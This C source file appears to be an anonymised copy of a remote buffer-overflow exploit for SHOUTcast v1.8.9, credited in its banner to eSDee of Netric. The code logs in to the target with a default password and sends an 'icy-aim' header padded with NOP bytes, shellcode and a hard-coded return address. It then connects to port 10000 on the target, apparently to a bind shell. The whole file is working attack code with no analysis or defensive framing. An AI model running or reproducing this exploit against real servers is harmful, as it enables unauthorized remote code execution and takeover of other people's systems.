
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int pass ;
typedef int host ;
typedef int buf2 ;
typedef int buf1 ;


 int VAR_0 ;
 int FUNC_0 (int ) ;
 int FUNC_1 (int) ;
 int FUNC_2 (int) ;
 int FUNC_3 (int ,char*,...) ;
 int FUNC_4 (int,char**,char*) ;
 int FUNC_5 (char*,int,int) ;
 int FUNC_6 (char*,int) ;
 int VAR_1 ;
 int FUNC_7 () ;
 char* VAR_2 ;
 int FUNC_8 (int) ;
 int VAR_3 ;
 int FUNC_9 (char*,char*,char*) ;
 int VAR_4 ;
 int VAR_5 ;
 int FUNC_10 (char*) ;
 int FUNC_11 (char*,int ,int) ;
 int FUNC_12 (char*) ;
 int FUNC_13 (int,char*,int) ;

int
FUNC_14 (int VAR_6,char *VAR_7[])
{
        char VAR_8[1130];
        char VAR_9[1800];
        char VAR_10[256];
        char VAR_11[256]="changeme";

        int VAR_12=0;
        int VAR_13=0;
        int VAR_14=8001;
        unsigned int VAR_15 = 0x08069687;

        FUNC_3(VAR_5,"SHOUTcast v1.8.9 remote exploit by eSDee of Netric\n");
        FUNC_3(VAR_5,"-----------------------------------(www.netric.org)\n");

        while((VAR_13=FUNC_4(VAR_6,VAR_7,"t:p:a:")) !=VAR_0)
        {
                switch(VAR_13)
                {
                        case 'p':
                                VAR_14=FUNC_0(VAR_1);
                                if ((VAR_14 <= 0) || (VAR_14 > 65535)) {
                                        FUNC_3(VAR_4,"Invalid port.\n\n");
                                        FUNC_2(1);
                                }
                                break;
                        case 'a':
                                FUNC_5(VAR_11,0x0,sizeof(VAR_11));
                                FUNC_11(VAR_11,VAR_1,sizeof(VAR_11) - 1);
                                break;
                        case 't':
                                FUNC_5(VAR_10,0x0,sizeof(VAR_10));
                                FUNC_11(VAR_10,VAR_1,sizeof(VAR_10) - 1);
                                break;
                        default:
                                FUNC_12(VAR_7[0]);
                                FUNC_2(1);
                                break;
                }
        }


        if (FUNC_10(VAR_10) == 0) {
                FUNC_12(VAR_7[0]);
                FUNC_2(1);
        }
        VAR_3=FUNC_6(VAR_10, VAR_14);

        if (VAR_3==-1) {
                FUNC_3(VAR_4,"- Unable to connect.\n\n");
                FUNC_2(1);
        }

        FUNC_13(VAR_3, VAR_11, FUNC_10(VAR_11));
        FUNC_13(VAR_3, "\n", 1);

        FUNC_5(VAR_9, 0x0, sizeof(VAR_9));
        FUNC_5(VAR_8, 0x90, sizeof(VAR_8));

        for(VAR_12=0;VAR_12 < FUNC_10(VAR_2); VAR_12++) VAR_8[VAR_12+600] = VAR_2[VAR_12];

        VAR_8[759] = (VAR_15 & 0x000000ff);
        VAR_8[760] = (VAR_15 & 0x0000ff00) >> 8;
        VAR_8[761] = (VAR_15 & 0x00ff0000) >> 16;
        VAR_8[762] = (VAR_15 & 0xff000000) >> 24;

        VAR_8[1120] = 0x0;

        FUNC_9(VAR_9, "icy-name: netric\r\n"
                        "icy-aim: %s\r\n"
                        "\r\n", VAR_8);

        FUNC_3(VAR_5, "Connected, sending code...\n");
        FUNC_3(VAR_5, "Ret: 0x%08x\n", VAR_15);

        FUNC_13(VAR_3, VAR_9, FUNC_10(VAR_9));
        FUNC_8(2);
        FUNC_1(VAR_3);

        VAR_3=FUNC_6(VAR_10, 10000);

        if (VAR_3==-1) {
                FUNC_3(VAR_4, "Exploit failed!\n\n");
                FUNC_2(1);
        }

        FUNC_3(VAR_5, "Exploiting succesful.\n");
        FUNC_3(VAR_5, "---------------------------------------------------\n");
        FUNC_7();
        return 0;
}
